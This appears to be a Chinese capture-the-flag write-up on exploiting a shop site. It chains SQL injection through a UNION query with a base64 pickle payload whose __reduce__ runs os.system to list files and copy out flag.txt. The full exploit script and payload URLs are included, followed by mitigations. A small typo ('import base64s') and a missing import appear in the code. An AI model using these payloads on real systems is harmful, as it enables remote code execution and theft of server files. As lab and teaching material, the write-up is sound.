# Q2 C.O.P

## 瀏覽畫面

購物網站，滿滿的 pickles
![image](https://hackmd.io/_uploads/Hy8ztnysA.png)

先隨機瀏覽網頁
![image](https://hackmd.io/_uploads/HJMSYh1o0.png)

## 觀查網站

先在 URL 用 `-1' OR '1 = 1'` 觀察，看是否可以 sql injection
![image](https://hackmd.io/_uploads/ryJgKn1s0.png)

看來可行，並沒有產生 error

## 觀察 source code

看他 GET 產品、所有產品的程式碼，看來剛剛的攻擊是有效的
![image](https://hackmd.io/_uploads/HyU1c2ys0.png)

`database.py` 內有他原始如何將照片與產品敘述放入 DB 的方式

![image](https://hackmd.io/_uploads/r147q3JoC.png)

其中，可以很明顯到他運用 base64 對 pickle 物件進行加密儲存

```
    with open('schema.sql', mode='r') as f:
        shop = map(lambda x: base64.b64encode(pickle.dumps(x)).decode(), items)
        get_db().cursor().executescript(f.read().format(*list(shop)))
```

載入時，用 pickle 對物件從資料庫還原，故每一筆資料必定會進行 base64 解密，再進行 pickle.loads 的動作(傳入資料/DB 資料)，而這邊正是我們可以對 pickle 作文章的地方
![image](https://hackmd.io/_uploads/BkeQs3JsC.png)

## 嘗試解題

先觀察可以被看到的路徑
![image](https://hackmd.io/_uploads/SJD1phJjR.png)

`src="/static/images/pickle.jpg"` =>確定移到`/static/images/`的檔案是可以被看到的

確定一下 static 的上一層資料夾，以及 flag 的位置(btw 此檔案內包含 flag 並非正確 flag)
![image](https://hackmd.io/_uploads/BytD6nkj0.png)

先透過 ls > application/static/images/ls.txt 確定一下實際檔案分布。並利用 pickle 使用 `__reduce__(self):`時會將整個指令直接跑一遍的特性，配合 base64 編碼，用物件將指令包進去，使網站在進行 filter 時，執行 load()時，自動執行我們編寫的 shell 指令。

使用 UNION-base 方法，將加密過、壓縮過後的、包含指令的物件傳過去網站

```
http://{web url}/view/0'%20UNION%20ALL%20SELECT%20'gASVGwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjACUhZRSlC4='--
```

程式碼

```python=1
import pickle
import base64s
import urllib.parse
import requests
import os


class data:
    def __reduce__(self):
        return os.system, ("ls > application/static/ls.txt",)


p = f"0' UNION ALL SELECT '{base64.b64encode(pickle.dumps(data())).decode()}'--"
print(p)
```

印出所有檔案
![image](https://hackmd.io/_uploads/r12hzayjC.png)

再將 flag.txt 內容印出到 `/static/images/`

`"cat flag.txt > application/static/flag.txt"`

```
http://{web url}/view/0'%20UNION%20ALL%20SELECT%20'gASVRQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCpjYXQgZmxhZy50eHQgPiBhcHBsaWNhdGlvbi9zdGF0aWMvZmxhZy50eHSUhZRSlC4='--
```

查看

![image](https://hackmd.io/_uploads/HJkS46ko0.png)
通過!

## \*補充

反序列化攻擊/漏洞

當反序列化的對象來自不可信的源時，攻擊者可以注入惡意程式碼，導致執行任意操作。例如，使用 pickle 進行反序列化時，如果未對輸入進行驗證，攻擊者可以創造包含惡意程式碼的 pickle 數據。

```python=1
import pickle
import os

# 惡意程式
class Malicious:
    def __reduce__(self):
        return (os.system, ('echo Hacked!',))

# 序列化
malicious_data = pickle.dumps(Malicious())

# 反序列化时會執行__reduce__裡的指令
pickle.loads(malicious_data)
```

## \*Patch

- 安全反序列化的原則 :
  防範反序列化攻擊的第一原則就是：避免從不可信來源反序列化。只有當你完全信任數據的來源時，才可以使用反序列化。

- 安全的反序列化代碼示例 :
  如果必須使用 Pickle 進行反序列化，可以考慮重載 find_class 來限定範圍限制反序列化的對象類型：

```python=1
import pickle
import types

# 自定義Unpickler，限制可反序列化的類型
class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module == "builtins" and name in {"str", "list", "dict", "set", "int", "float", "bool"}:
            return getattr(__import__(module), name)
        raise pickle.UnpicklingError(f"global '{module}.{name}' is forbidden")

def restricted_loads(s):
    return RestrictedUnpickler(io.BytesIO(s)).load()
```

- 使用其他安全的序列化方式（如 JSON）:
  一個更安全的做法是使用 JSON 替代 Pickle 進行序列化和反序列化。JSON 只支持基本數據類型，不會執行任意代碼，因而更安全。

```python=1
import json

# 序列化對象
data = {'name': 'Alice', 'age': 25, 'city': 'New York'}
data_json = json.dumps(data)

# 反序列化對象
data = json.loads(data_json)
```

---

reference :

1. UNION-base 方法
   https://tech-blog.cymetrics.io/posts/nick/sqli/

2. python pickle 套件 https://docs.python.org/3/library/pickle.html

3. 解決、補充
   https://xie.infoq.cn/article/d7af40d3e86722eb21224c50e
